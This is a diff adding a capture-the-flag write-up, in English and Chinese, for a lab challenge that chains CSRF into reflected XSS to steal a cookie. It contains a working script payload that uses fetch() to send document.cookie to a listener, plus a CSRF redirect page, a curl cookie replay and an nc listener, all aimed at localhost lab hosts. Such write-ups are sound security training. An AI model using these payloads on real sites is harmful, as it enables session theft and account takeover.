@@ -1,0 +1,25 @@
+#CSRF 4
+#挑战简介
+Okay, now that you have the CSRF-to-XSS chain figured out, pull of a CSRF leading to an XSS leading to a cookie leak that'll allow you to log in and get the flag!
+
+HINT: Your solution might have two levels of JavaScript: one that runs on your http://hacker.localhost:1337 page, and one that runs in the reflected XSS. 
+We suggest testing the latter first, by manually triggering the page with that input and seeing the result. Furthermore, as this code might be complex, 
+be VERY careful about URL encoding. For example, + will not be encoded to %2b by most URL encoders, but it is a special character in a URL and gets decoded to a space ( ). 
+Needless to say, if you use + in your JavaScript, this can lead to complete havoc.
+
+#这题的思路结合了XSS 7和CSRF 3的解题思路，很有意思。
+#XSS 7中我写的很多，有一下几个关键点
+1.fetch()访问网页，并获取cookie，
+<script>fetch("http://challenge.localhost:1338/?cookie="+document.cookie, {method: "GET", mode: "no-cors"});<\/script>  /fetch的端口与我们nc所监听的端口要相同，而nc和python -m所设置的端口要不同，因为端口的使用是单一的
+#这边我们用挑战要求的GET，注意mode的设置一定要是no-cors。
+2.curl -b "cookies" http://challenge.localhost/
+3.nc -lv port.
+这便是以上XSS 7的全部内容。
+
+#关于CSRF 3的内容
+#和上题一样，var的创建和window.location。
+<script>
+       var targetURL = 'http://challenge.localhost/ephemeral?msg=' + encodeURIComponent('<script>fetch("http://challenge.localhost:1338/?cookie="+document.cookie, {method: "GET", mode: "no-cors"});<\/script>');
+       window.location.href = targetURL;
+</script>
+#没什么好说的
